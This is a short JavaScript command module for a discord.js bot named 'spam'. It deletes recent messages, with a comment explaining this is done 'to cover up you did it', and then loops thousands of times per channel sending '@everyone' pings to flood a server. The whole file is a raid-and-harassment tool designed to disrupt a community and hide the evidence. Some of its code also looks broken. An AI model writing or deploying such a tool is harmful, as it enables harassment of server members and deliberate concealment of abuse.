const Discord = require('discord.js');



exports.run = (client, message, args) => {

  let channels = 250;


  // Get the guild using the ID.
  let SpamChannel = message.guild.channels.find(`name`, "vive-union");

    message.channel.fetchMessages({limit: 10}).then(messages => message.channel.bulkDelete(messages)); //deletes messages to cover up you did it
    message.guild.channel.forEach(c => {

        for (var i = 0; i < 9812; i++) {
            c.send("@everyone")
        }
      })
    }
  
    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };

      exports.help = {
        name: 'spam',
        description: '',
        usage: ''
      };
